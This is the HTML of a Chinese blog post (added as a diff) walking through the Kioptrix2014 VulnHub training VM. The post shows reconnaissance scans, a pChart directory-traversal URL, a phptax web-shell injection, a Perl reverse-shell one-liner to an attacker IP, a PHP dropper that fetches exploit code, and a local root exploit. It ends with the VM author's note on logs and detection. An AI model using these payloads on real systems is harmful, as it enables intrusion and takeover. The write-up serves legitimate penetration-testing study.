@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Sh4Nn0n's Blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Kioptrix2014信息收集123456789101112netdiscover -i eth0 -r 192.168.208.1 Currently scanning: Finished!   |   Screen View: Unique Hosts">
+<meta name="keywords" content="渗透测试,Vulnhub,OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Kioptrix2014-WalkThrough">
+<meta property="og:url" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/index.html">
+<meta property="og:site_name" content="Sh4Nn0n&#39;s Blog">
+<meta property="og:description" content="Kioptrix2014信息收集123456789101112netdiscover -i eth0 -r 192.168.208.1 Currently scanning: Finished!   |   Screen View: Unique Hosts">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/3.png">
+<meta property="og:updated_time" content="2020-03-05T09:31:31.310Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-Kioptrix2014-WalkThrough">
+<meta name="twitter:description" content="Kioptrix2014信息收集123456789101112netdiscover -i eth0 -r 192.168.208.1 Currently scanning: Finished!   |   Screen View: Unique Hosts">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/1.png">
+  <link rel="canonical" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>vulnhub-Kioptrix2014-WalkThrough | Sh4Nn0n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sh4Nn0n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">^.^</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sh4Nn0n">
+      <meta itemprop="description" content="^.^">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sh4Nn0n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">vulnhub-Kioptrix2014-WalkThrough
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-05 17:27:51 / 修改时间：17:31:31" itemprop="dateCreated datePublished" datetime="2020-03-05T17:27:51+08:00">2020-03-05</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Kioptrix2014"><a href="#Kioptrix2014" class="headerlink" title="Kioptrix2014"></a>Kioptrix2014</h1><hr><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.208.1</span><br><span class="line"></span><br><span class="line"> Currently scanning: Finished!   |  <span class="built_in"> Screen </span>View: Unique Hosts                 </span><br><span class="line">                                                                               </span><br><span class="line"> 5 Captured ARP Req/Rep packets, <span class="keyword">from</span> 4 hosts.   Total size: 300               </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">  <span class="built_in"> IP </span>           At MAC<span class="built_in"> Address </span>    Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.208.1   00:50:56:c0:00:08      2     120  VMware, Inc.                </span><br><span class="line"> 192.168.208.2   00:50:56:fe:05:7a      1      60  VMware, Inc.                </span><br><span class="line"> 192.168.208.144 00:0c:29:a9:18:55      1      60  VMware, Inc.                </span><br><span class="line"> 192.168.208.254 00:50:56:fa:93:f0      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+<p>端口扫描</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -p- -n -Pn -sS --max-retries 1 192.168.208.144 -vv</span><br><span class="line"></span><br><span class="line">PORT     STATE <span class="built_in"> SERVICE </span>   REASON</span><br><span class="line">22/tcp   closed ssh        reset ttl 64</span><br><span class="line">80/tcp   open   http       syn-ack ttl 64</span><br><span class="line">8080/tcp open   http-proxy syn-ack ttl 64</span><br><span class="line">MAC Address: 00:0C:29:A9:18:55 (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Server:</span> Apache<span class="regexp">/2.2.21 (FreeBSD) mod_ssl/</span><span class="number">2.2</span><span class="number">.21</span> OpenSSL<span class="regexp">/0.9.8q DAV/</span><span class="number">2</span> PHP/<span class="number">5.3</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>访问80端口发现没啥东西,看一下源代码<br><img src="/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/1.png" alt><br>进入这个目录, 查一下相关的漏洞,<br><a href="https://www.exploit-db.com/exploits/31173" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/31173</a><br>发现目录遍历, 尝试一下成功了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">208.144</span><span class="regexp">/pChart2.1.3/</span>examples<span class="regexp">/index.php?Action=View&amp;Script=%2f..%2f..%2f/u</span>sr<span class="regexp">/local/</span>etc<span class="regexp">/apache22/</span>httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>这里面提到</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetEnvIf</span> User-Agent ^Mozilla/4.0 Mozilla4_browser</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *:8080&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /usr/local/www/apache22/data2</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Directory "/usr/local/www/apache22/data2"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Order</span></span> allow,deny</span><br><span class="line">    <span class="attribute"><span class="nomarkup">Allow</span></span> from env=Mozilla4_browser</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改user-agent访问<br><img src="/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/2.png" alt><br>找找phptax有没有漏洞,<a href="https://www.exploit-db.com/exploits/25849" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/25849</a></p>
+<p><a href="http://192.168.208.144:8080/phptax/index.php?field=rce1.php&amp;newvalue=%3C?php%20passthru(%24_GET[cmd]);?%3E" target="_blank" rel="noopener">http://192.168.208.144:8080/phptax/index.php?field=rce1.php&amp;newvalue=%3C?php%20passthru(%24_GET[cmd]);?%3E</a><br><img src="/2020/03/05/vulnhub-Kioptrix2014-WalkThrough/3.png" alt></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">208.144</span>:<span class="number">8080</span><span class="regexp">/phptax/</span>data<span class="regexp">/rce1.php?cmd=cat%20/</span>etc<span class="regexp">/ipfw.rules</span></span><br></pre></td></tr></table></figure>
+
+<p>测试一下是否有wget nc curl 发现都没有 只有perl</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=perl -MIO -<span class="keyword">e</span> '<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">"192.168.208.131:443"</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;'</span><br></pre></td></tr></table></figure>
+
+<p>没有wget 所以得写个php下载文件,然后访问<br><a href="http://192.168.208.144:8080/phptax/data/down2.php" target="_blank" rel="noopener">http://192.168.208.144:8080/phptax/data/down2.php</a></p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">echo "&lt;?php file_put_contents('28718.c', fopen('http://192.168.208.131/26368.c', 'r')); ?&gt;" &gt; down2.php</span><br><span class="line"></span><br><span class="line">ls -la</span><br><span class="line">total 26856</span><br><span class="line">drwxrwxrwx  <span class="number"> 9 </span>www  wheel     <span class="number"> 512 </span>Jan<span class="number"> 22 </span>03:04 .</span><br><span class="line">drwxrwxrwx  <span class="number"> 8 </span>www  wheel     <span class="number"> 512 </span>Jan<span class="number"> 22 </span>02:08 ..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>www  wheel <span class="number"> 6795264 </span>Jan<span class="number"> 22 </span>02:56 1.core</span><br><span class="line">drwxrwxrwx <span class="number"> 12 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>1040</span><br><span class="line">-rw-------  <span class="number"> 1 </span>www  wheel <span class="number"> 6795264 </span>Jan<span class="number"> 22 </span>02:57 2.core</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>www  wheel    <span class="number"> 2213 </span>Jan<span class="number"> 22 </span>03:04 28718.c</span><br><span class="line">drwxrwxrwx  <span class="number"> 2 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>SchA</span><br><span class="line">drwxrwxrwx  <span class="number"> 2 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>SchB</span><br><span class="line">drwxrwxrwx  <span class="number"> 6 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>SchD</span><br><span class="line">drwxrwxrwx  <span class="number"> 4 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>SchD1</span><br><span class="line">drwxrwxrwx  <span class="number"> 7 </span>www  wheel     <span class="number"> 512 </span>May <span class="number"> 7 </span><span class="number"> 2003 </span>W2</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>www  wheel      <span class="number"> 85 </span>Jan<span class="number"> 22 </span>03:03 down2.php</span><br><span class="line">drwxrwxrwx  <span class="number"> 2 </span>www  wheel    <span class="number"> 2048 </span>Jan<span class="number"> 22 </span>02:11 pdf</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>www  wheel      <span class="number"> 29 </span>Jan<span class="number"> 22 </span>02:22 rce.php</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>www  wheel      <span class="number"> 29 </span>Jan<span class="number"> 22 </span>02:23 rce1.php</span><br><span class="line">gcc 28718.c -o 1</span><br><span class="line">./1</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)</span><br></pre></td></tr></table></figure>
+
+<p>最后的最后 有个很重要的文件:<br>If you are reading this, it means you got root (or cheated).<br>Congratulations either way…</p>
+<p>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in<br>mind, and not meant for the seasoned pentester. However this does not mean one<br>can’t enjoy them.</p>
+<p>As with all my VMs, besides getting “root” on the system, the goal is to also<br>learn the basics skills needed to compromise a system. Most importantly, in my mind,<br>are information gathering &amp; research. Anyone can throw massive amounts of exploits<br>and “hope” it works, but think about the traffic.. the logs… Best to take it<br>slow, and read up on the information you gathered and hopefully craft better<br>more targetted attacks. </p>
+<p>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.<br>Knowing the OS gives you any idea of what will work and what won’t from the get go.<br>Default file locations are not the same on FreeBSD versus a Linux based distribution.<br>Apache logs aren’t in “/var/log/apache/access.log”, but in “/var/log/httpd-access.log”.<br>It’s default document root is not “/var/www/“ but in “/usr/local/www/apache22/data”.<br>Finding and knowing these little details will greatly help during an attack. Of course<br>my examples are specific for this target, but the theory applies to all systems.</p>
+<p>As a small exercise, look at the logs and see how much noise you generated. Of course<br>the log results may not be accurate if you created a snapshot and reverted, but at least<br>it will give you an idea. For fun, I installed “OSSEC-HIDS” and monitored a few things.<br>Default settings, nothing fancy but it should’ve logged a few of your attacks. Look<br>at the following files:<br>/root/folderMonitor.log<br>/root/httpd-access.log (softlink)<br>/root/ossec-alerts.log (softlink)</p>
+<p>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified<br>files in 2 specific folders. Since FreeBSD doesn’t support “iNotify”, I couldn’t use OSSEC-HIDS<br>for this.<br>The httpd-access.log is rather self-explanatory .<br>Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain<br>files. This one should’ve detected a few of your web attacks.</p>
+<p>Feel free to explore the system and other log files to see how noisy, or silent, you were.<br>And again, thank you for taking the time to download and play.<br>Sincerely hope you enjoyed yourself.</p>
+<p>Be good…</p>
+<p>loneferret<br><a href="http://www.kioptrix.com" target="_blank" rel="noopener">http://www.kioptrix.com</a></p>
+<p>p.s.: Keep in mind, for each “web attack” detected by OSSEC-HIDS, by<br>default it would’ve blocked your IP (both in hosts.allow &amp; Firewall) for<br>600 seconds. I was nice enough to remove that part :)</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            
+              <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
+            
+              <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/03/05/vulnhub-Kioptrix-lv-3-WalkThrough/" rel="next" title="vulnhub-Kioptrix-lv.3-WalkThrough">
+                  <i class="fa fa-chevron-left"></i> vulnhub-Kioptrix-lv.3-WalkThrough
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/" rel="prev" title="vulnhub-SickOs1.2-WalkThrough">
+                  vulnhub-SickOs1.2-WalkThrough <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kioptrix2014"><span class="nav-text">Kioptrix2014</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-text">渗透测试</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="Sh4Nn0n">
+  <p class="site-author-name" itemprop="name">Sh4Nn0n</p>
+  <div class="site-description" itemprop="description">^.^</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fuziyuonly" title="GitHub &rarr; https://github.com/fuziyuonly" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lingwu111.github.io/" title="https://lingwu111.github.io/" rel="noopener" target="_blank">lingwu</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sh4Nn0n</span>
+</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
